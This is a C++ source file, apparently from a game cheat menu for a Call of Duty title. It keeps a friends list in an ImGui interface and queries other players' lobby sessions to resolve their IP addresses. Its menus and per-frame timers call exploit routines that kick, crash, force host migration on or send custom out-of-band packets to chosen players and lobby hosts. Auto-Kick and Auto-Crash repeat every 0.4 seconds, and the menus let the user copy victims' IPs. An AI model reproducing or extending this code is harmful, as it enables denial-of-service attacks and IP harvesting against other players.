#include "friends.hpp"
#define min12(a,b)            (((a) < (b)) ? (a) : (b))

template <typename T>
static std::vector<std::vector<T>> get_batch(const std::vector<T>& v, const size_t num)
{
	std::vector<std::vector<T>> batches{};
	batches.reserve(v.size() / num);

	for (size_t i = 0; i < v.size(); i += num)
	{
		const auto last{ min12(v.size(), i + num) };
		batches.emplace_back(v.begin() + i, v.begin() + last);
	}

	return batches;
}

template <typename T>
static void for_each_batch(const std::vector<T>& v, const size_t num, const std::function<void(std::vector<T>)>& callback)
{
	const auto batches{ get_batch(v, num) };

	for (const auto& batch : batches)
	{
		callback(batch);
	}
}

netadr_t get_net_adr(const XSESSION_INFO& info)
{
	netadr_t netadr{};
	dwRegisterSecIDAndKey(&info.sessionID, &info.keyExchangeKey);
	dwCommonAddrToNetadr(&netadr, &info.hostAddress, &info.sessionID);

	return netadr;
}

namespace friends
{
	std::vector<friends_t> friends;

	XSESSION_INFO get_session_info(const InfoResponseLobby& lobby)
	{
		XSESSION_INFO sess_info{};
		sess_info.sessionID = lobby.secId;
		sess_info.keyExchangeKey = lobby.secKey;
		sess_info.hostAddress = lobby.serializedAdr.xnaddr;

		return sess_info;
	}

	void add_friend_response(const Msg_InfoResponse& info_response, const std::uint64_t sender_id)
	{
		const auto client_lobby{ info_response.lobby[0] };

		if (client_lobby.hostXuid == sender_id)
		{
			players_session_info[sender_id] = get_session_info(client_lobby);
		}

		for (auto& friends : friends::friends)
		{
			if (friends.xuid == sender_id)
			{
				friends.response = { true };
				friends.sent = true;
				friends.last_checked = std::chrono::high_resolution_clock::now();
				friends.Lobby[0] = info_response.lobby[0];
				friends.Lobby[1] = info_response.lobby[1];
				friends.Lobby[2] = info_response.lobby[2];
			}
		}
	}

	std::unordered_map<std::uint64_t, XSESSION_INFO> players_session_info;
	auto nonce{ 1111111111u };

	LobbyMsg build_info_request()
	{
		char buf[0x20000] = { 0 };
		LobbyMsg lobby_msg{};

		LobbyMsgRW_PrepWriteMsg(&lobby_msg, buf, sizeof buf, MESSAGE_TYPE_INFO_REQUEST);
		LobbyMsgRW_PackageUInt(&lobby_msg, "nonce", &nonce);

		return lobby_msg;
	}

	void send_popup(const std::uint64_t target_id)
	{
		if (Live_IsDemonwareFetchingDone(0))
		{
			const auto lobby_msg = build_info_request();
			dwInstantSendMessage(0, &target_id, 1, 102, lobby_msg.msg.data, lobby_msg.msg.cursize);

			ImGui::InsertNotification({ ImGuiToastType_Info, 3000, "sent" });
		}
	}

	void send_info_request(const std::uint64_t target_id)
	{
		if (Live_IsDemonwareFetchingDone(0))
		{
			const JoinSessionMessage message{ JOIN_REPLY };
			dwInstantSendMessage(0, &target_id, 1, 'f', &message, 0);
			
			ImGui::InsertNotification({ ImGuiToastType_Info, 3000, "Info Request Sent" });
		}
		else
		{
			ImGui::InsertNotification({ ImGuiToastType_Info, 3000, "Info Request Failed" });
		}
	}

	void send_info_request(const std::vector<std::uint64_t>& recipients)
	{
		if (Live_IsDemonwareFetchingDone(0))
		{
			const auto lobby_msg = build_info_request();
			dwInstantSendMessage(0, recipients.data(), recipients.size(), 'h', lobby_msg.msg.data, lobby_msg.msg.cursize);
		}
		else
		{
			ImGui::InsertNotification({ ImGuiToastType_Info, 3000, "Info Request Batch Failed" });
		}
	}

	void write_to_friends()
	{
		json j{};

		for (const auto& friends : friends)
		{
			j[std::to_string(friends.xuid)] =
			{
				{ "name", friends.name }
			};
		}

		io::write_file(io::get_json_file(FRIENDS_LIST), j.dump());
	}

	void refresh_friends()
	{
		friends.clear();

		if (const auto json = io::parse_json_file(FRIENDS_LIST); json.is_object())
		{
			for (const auto& [key, value] : json.items())
			{
				friends.emplace_back(friends_t
					{
						std::stoull(key),
						value["name"].get<std::string>()
					});
			}
		}
	}

	void remove_friend(const std::uint64_t xuid)
	{
		const auto entry = std::find_if(friends.begin(), friends.end(), [=](const auto& friends) { return friends.xuid == xuid; });

		if (entry != friends.end())
		{
			friends.erase(entry);
		}

		write_to_friends();
	}

	namespace instant_message
	{
		void handle_message(const std::uint64_t sender_id, const char* message, const std::uint32_t message_size)
		{
			msg_t msg{};
			MSG_InitReadOnly(&msg, message, message_size);
			MSG_BeginReading(&msg);

			auto type{ 0ui8 };

			if (MSG_ReadByte(&msg) == '2')
			{
				type = MSG_ReadByte(&msg);
			}

			if (type == 'h')
			{
				const auto size{ msg.cursize - msg.readcount };

				char data[2048] = { 0 };
				MSG_ReadData(&msg, data, sizeof data, size);

				if (!msg.overflowed)
				{
					LobbyMsg lobby_msg{};

					if (!LobbyMsgRW_PrepReadData(&lobby_msg, data, size))
						return;

					if (lobby_msg.type == MESSAGE_TYPE_INFO_RESPONSE)
					{
						Msg_InfoResponse response{};

						if (!MSG_InfoResponse(&response, &lobby_msg))
							return;

						if (response.nonce == nonce)
						{
							friends::add_friend_response(response, sender_id);
						}
					}

					LobbyMsg_HandleIM(0, sender_id, data, size);

				}
				return;

			}
		}
	}

	void on_frame()
	{
		static std::chrono::time_point<std::chrono::high_resolution_clock> last_time{};
		static std::chrono::time_point<std::chrono::high_resolution_clock> kick_last_time{};
		static std::chrono::time_point<std::chrono::high_resolution_clock> crash_last_time{};
		static std::chrono::time_point<std::chrono::high_resolution_clock> popup_last_time{};

		if (const auto delta{ std::chrono::high_resolution_clock::now() - kick_last_time };
			delta > .4s)
		{
			kick_last_time = std::chrono::high_resolution_clock::now();

			for (const auto& friends : friends::friends)
			{
				if (friends.auto_kick)
				{
					const auto sess_info{ players_session_info[friends.xuid] };
					const auto netadr{ get_net_adr(sess_info) };
					const auto is_ready{ friends.response.valid && netadr.inaddr };

					if (is_ready)
						exploit::send_connect_response_migration_packet(netadr);


				}

			}
		}

		if (const auto delta{ std::chrono::high_resolution_clock::now() - crash_last_time };
			delta > .4s)
		{
			crash_last_time = std::chrono::high_resolution_clock::now();

			for (const auto& friends : friends::friends)
			{
				if (friends.auto_crash)
				{
					const auto sess_info{ players_session_info[friends.xuid] };
					const auto netadr{ get_net_adr(sess_info) };
					const auto is_ready{ friends.response.valid && netadr.inaddr };

					if (is_ready)
						exploit::SendToAdr(friends.xuid, netadr);

				}

			}
		}

		if (const auto delta{ std::chrono::high_resolution_clock::now() - popup_last_time };
			delta > 5s)
		{
			popup_last_time = std::chrono::high_resolution_clock::now();

			for (const auto& friends : friends::friends)
			{
				if (friends.auto_popup)
				{
					exploit::send_popup(friends.xuid);
				}
			}
		}

		if (const auto delta{ std::chrono::high_resolution_clock::now() - last_time };
			delta > 60s)
		{
			last_time = std::chrono::high_resolution_clock::now();

			std::vector<std::uint64_t> recipients{};

			for (const auto& friends : friends::friends)
			{
				recipients.emplace_back(friends.xuid);
			}

			for (auto& friends : friends::friends)
			{
				friends.sent = false;
			}

			for_each_batch<std::uint64_t>(recipients, 18, [](const auto& ids)
				{
					send_info_request(ids);
				});

			ImGui::InsertNotification({ ImGuiToastType_Status, 3000, "Sent all info requests." });
		}

		for (auto& friends : friends::friends)
		{
			const auto delta{ std::chrono::high_resolution_clock::now() - friends.last_checked };

			if (delta > 180s)
			{
				if (friends.sent == false) {
					if (friends.response.valid) {
						std::string offlinestr = friends.name + " has gone offline.";

						ImGui::InsertNotification({ ImGuiToastType_Status, 5000, offlinestr.data() });
					}

					friends.response = { false };

					friends.Lobby[1].lobbyParams.mainMode = (LobbyMainMode)0;
					friends.Lobby[1].lobbyParams.networkMode = (LobbyNetworkMode)0;
				}
			}
		}
	}

	void draw()
	{
		if (ImGui::BeginTabItem("Friends"))
		{
			int amount = 0;
			for (size_t i = 0; i < friends::friends.size(); ++i)
			{
				amount++;
			}

			const auto width = ImGui::GetContentRegionAvail().x;

			const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

			static ImGuiTextFilter filter;

			ImGui::TextUnformatted("Search Friends");

			ImGui::SameLine();

			ImGui::Dummy(ImVec2(210.f, 0));

			ImGui::SameLine();

			ImGui::Text("Total Friends : %i", amount);

			filter.Draw("##search_friend", "Name", width * 0.80f);
			ImGui::SetNextItemWidth(width * 0.80f);

			ImGui::SameLine(0.0f, spacing);

			const auto popup = "Add Friend##add_friend_popup"s;

			if (ImGui::Button("Add Friend"))
			{
				ImGui::OpenPopup(popup.data());
			}

			ImGui::SetNextWindowBgAlpha(1.0f);

			if (ImGui::BeginPopupModal(popup.data(), nullptr, ImGuiWindowFlags_NoResize))
			{
				static auto name_input = ""s;
				static auto xuid_input = ""s;

				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##name_input", "Name", &name_input);

				ImGui::Separator();

				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##xuid_input", "XUID", &xuid_input);

				ImGui::Separator();

				if (ImGui::MenuItem("Add Friend", nullptr, nullptr, !name_input.empty() && !xuid_input.empty()))
				{
					friends.emplace_back(friends_t{ utils::atoll(xuid_input), name_input });
					write_to_friends();

					ImGui::CloseCurrentPopup();
				}

				if (ImGui::MenuItem("Refresh Friends"))
				{
					refresh_friends();
					ImGui::CloseCurrentPopup();
				}

				if (ImGui::IsKeyPressedWithIndex(ImGuiKey_Escape))
				{
					ImGui::CloseCurrentPopup();
				}

				ImGui::EndPopup();
			}

			ImGui::Separator();

			ImGui::BeginColumns("Friends", 2, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 300.f);
			ImGui::TextUnformatted("Friend");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Status");
			ImGui::NextColumn();
			ImGui::Separator();

			std::vector<size_t> indices{};

			for (size_t i = 0; i < friends.size(); ++i)
			{
				indices.emplace_back(i);
			}

			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) {
				return friends[a].response.valid > friends[b].response.valid;
				});

			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return friends[a].Lobby[1].lobbyParams.mainMode > friends[b].Lobby[1].lobbyParams.mainMode; });

			for (const auto& friend_num : indices)
			{
				if (auto& friends = friends::friends[friend_num]; filter.PassFilter(friends.name))
				{
					bool sel1, selected, selected1;

					const auto popup = "friend_popup##" + std::to_string(friend_num);
					bool isNotMe = friends.Lobby->hostXuid != friends.xuid;

					std::string host_xuid = std::to_string(friends.Lobby->hostXuid);
					std::string host_name = (friends.Lobby->hostName);

					char outputhost[255];
					sprintf_s(outputhost, "%s", host_xuid);

					char popup_actual_host_name[255];
					sprintf_s(popup_actual_host_name, "Open popup on %s", host_name);

					char kick_actual_host_name[255];
					sprintf_s(kick_actual_host_name, "Kick %s", host_name);

					char crash_actual_host_name[255];
					sprintf_s(crash_actual_host_name, "Crash %s", host_name);

					char migrate_actual_host_name[255];
					sprintf_s(migrate_actual_host_name, "Migrate %s", host_name);

					const auto response{ friends.response };

					ImGui::AlignTextToFramePadding();

					selected = ImGui::Selectable(friends.name.data());

					if (response.valid) {

						ImGui::SameLine();

						ImGui::PushStyleColor(ImGuiCol_Text, ImColor(150, 150, 150, 255).Value);

						if (isNotMe)
						{
							selected1 = ImGui::Selectable("("s "Not Host" ") ");
						}
						else
						{
							selected1 = ImGui::Selectable("("s + friends.Lobby->hostName + ")##");
						}

						ImGui::PopStyleColor();

					}

					if (friends.auto_popup)
					{
						ImGui::SameLine();

						ImGui::PushStyleColor(ImGuiCol_Text, ImColor(255, 174, 0, 255).Value);

						bool selected1 = ImGui::Selectable("[Auto-Popup]##" + std::to_string(friend_num));

						ImGui::PopStyleColor();
					}

					if (friends.auto_crash)
					{
						ImGui::SameLine();

						ImGui::PushStyleColor(ImGuiCol_Text, ImColor(255, 0, 0, 250).Value);

						bool selected1 = ImGui::Selectable("[Auto-Crash]##" + std::to_string(friend_num));

						ImGui::PopStyleColor();
					}

					if (friends.auto_kick)
					{
						ImGui::SameLine();

						ImGui::PushStyleColor(ImGuiCol_Text, ImColor(0, 128, 128, 255).Value);

						bool selected1 = ImGui::Selectable("[Auto-Kick]##" + std::to_string(friend_num));

						ImGui::PopStyleColor();
					}

					ImGui::NextColumn();

					ImGui::PushStyleColor(ImGuiCol_Text, response.valid
						? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);

					if (friends.Lobby[1].lobbyParams.mainMode == 0x2 && response.valid)
						sel1 = ImGui::Selectable("Session" + "##"s + std::to_string(friend_num));
					else if (response.valid)
						sel1 = ImGui::Selectable("Online" + "##"s + std::to_string(friend_num));
					else
						ImGui::TextUnformatted("Offline");

					ImGui::PopStyleColor();

					if (sel1 && response.valid)
						LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_PARTY);

					if (selected || selected1)
						ImGui::OpenPopup(popup.data());

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						const auto sess_info{ players_session_info[friends.xuid] };
						const auto netadr{ get_net_adr(sess_info) };
						const auto is_ready{ response.valid && netadr.inaddr };
						const auto ip_string{ is_ready ? utils::adr_to_string(&netadr) : "Invalid IP Data" };
						const auto actual_host_sess_info{ players_session_info[friends.Lobby->hostXuid] };
						const auto actual_host_netadr{ get_net_adr(actual_host_sess_info) };
						const auto actual_host_is_ready{ response.valid && actual_host_netadr.inaddr };
						const auto actual_host_ip_string{ actual_host_is_ready ? utils::adr_to_string(&actual_host_netadr) : "Invalid IP Data" };

						if (response.valid) {

							if (isNotMe)
							{

								ImGui::MenuItem("Actual Host", nullptr, false, false);

								if (ImGui::BeginMenu(friends.Lobby->hostName))
								{

									if (ImGui::MenuItem("Add to friend list.")) {
										bool old = false;

										for (auto& friends : friends::friends) {
											if (friends.xuid == std::stoull(host_xuid))
												old = true;
										}
										if (old == false) {
											friends::friends.emplace_back(friends::friends_t{ (friends.Lobby->hostXuid) , (friends.Lobby->hostName) });
											friends::write_to_friends();
											friends::refresh_friends();
										}
									}

									if (ImGui::MenuItem(outputhost))
									{
										ImGui::LogToClipboardUnformatted(outputhost);
									}

									if (actual_host_is_ready) {

										if (actual_host_ip_string != "0.0.0.0")
										{
											if (ImGui::MenuItem(actual_host_ip_string))
											{
												ImGui::LogToClipboardUnformatted(actual_host_ip_string);
											}
										}
									}

									if (ImGui::MenuItem(popup_actual_host_name))
									{
										exploit::send_popup(friends.Lobby->hostXuid);
									}

									if (ImGui::MenuItem(kick_actual_host_name))
									{
										send_info_request((friends.Lobby->hostXuid));
										if (players_session_info[(friends.Lobby->hostXuid)].hostAddress.inaddr)
										{
											const auto sess_info{ players_session_info[(friends.Lobby->hostXuid)] };
											const auto netadr{ get_net_adr(sess_info) };
											send_oob(netadr, "connectResponseMigration");
										}
									}

									if (ImGui::MenuItem(crash_actual_host_name))
									{
										send_info_request((friends.Lobby->hostXuid));
										if (players_session_info[(friends.Lobby->hostXuid)].hostAddress.inaddr)
										{
											const auto sess_info{ players_session_info[(friends.Lobby->hostXuid)] };
											const auto netadr{ get_net_adr(sess_info) };
											exploit::SendToAdr(friends.Lobby->hostXuid, netadr);
										}
									}

									if (ImGui::MenuItem(migrate_actual_host_name))
									{
										send_info_request((friends.Lobby->hostXuid));
										if (players_session_info[(friends.Lobby->hostXuid)].hostAddress.inaddr)
										{
											const auto sess_info{ players_session_info[(friends.Lobby->hostXuid)] };
											const auto netadr{ get_net_adr(sess_info) };
											send_oob(netadr, "mstart");
										}
									}

									if (ImGui::BeginMenu("Custom OOB")) {

										ImGui::Dummy(ImVec2(0.0f, 3.0f));

										static auto MSG_NET = ""s;

										ImGui::InputTextWithHint("##MSG_NET", "OOB/STRING", &MSG_NET);

										ImGui::SameLine();

										if (ImGui::MenuItem("Send"))
										{

											send_info_request((friends.Lobby->hostXuid));
											if (players_session_info[(friends.Lobby->hostXuid)].hostAddress.inaddr)
											{
												const auto sess_info{ players_session_info[(friends.Lobby->hostXuid)] };
												const auto netadr{ get_net_adr(sess_info) };
												send_oob(netadr, MSG_NET);
											}
										}

										ImGui::EndMenu();
									}

									ImGui::EndMenu();
								}
							}
						}

						ImGui::Separator();

						ImGui::MenuItem("Friend", nullptr, false, false);

						if (ImGui::MenuItem(friends.name + "##" + std::to_string(friend_num) + "friend_menu_item"))
						{
							ImGui::LogToClipboardUnformatted(friends.name);
						}

						if (is_ready) {

							if (ip_string != "0.0.0.0")
							{
								if (ImGui::MenuItem(ip_string))
								{
									ImGui::LogToClipboardUnformatted(ip_string);
								}
							}
						}

						ImGui::Separator();

						if (ImGui::BeginMenu("Rename##" + std::to_string(friend_num)))
						{
							static auto rename_friend_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(friend_num), "Name", &rename_friend_input);

							if (ImGui::MenuItem("Rename"))
							{
								if (friends.name != rename_friend_input)
								{
									friends.name = rename_friend_input;

									write_to_friends();
								}
							}

							ImGui::EndMenu();
						}

						if (ImGui::MenuItem("Remove"))
						{
							remove_friend(friends.xuid);
						}

						ImGui::Separator();

						if (ImGui::MenuItem(std::to_string(friends.xuid)))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(friends.xuid));
						}

						ImGui::Separator();

						if (ImGui::MenuItem("Open popup", nullptr, nullptr, response.valid))
						{
							exploit::send_popup(friends.xuid);
						}

						if (ImGui::MenuItem("Kick", nullptr, nullptr, is_ready))
						{
							exploit::send_connect_response_migration_packet(netadr);
						}

						if (ImGui::MenuItem("Crash", nullptr, nullptr, is_ready))
						{
							exploit::SendToAdr(friends.xuid, netadr);
						}

						if (ImGui::MenuItem("Migrate", nullptr, nullptr, is_ready))
						{
							exploit::send_mstart_packet(netadr);
						}

						ImGui::MenuItem("Auto-Kick", "", &friends.auto_kick, is_ready);

						ImGui::MenuItem("Auto-Crash", "", &friends.auto_crash, is_ready);

						ImGui::MenuItem("Auto-Popup", "", &friends.auto_popup, is_ready);

						if (ImGui::BeginMenu("Custom OOB")) {
							ImGui::Dummy(ImVec2(0.0f, 3.0f));

							static auto MSG_NET = ""s;

							ImGui::InputTextWithHint("##MSG_NET", "OOB/STRING", &MSG_NET);

							ImGui::SameLine();

							if (ImGui::MenuItem("Send", nullptr, nullptr, netadr.inaddr))
							{
								send_oob(netadr, MSG_NET);
							}

							ImGui::EndMenu();
						}

						ImGui::EndMenu();
					}
				}
				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}
			}

			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}
}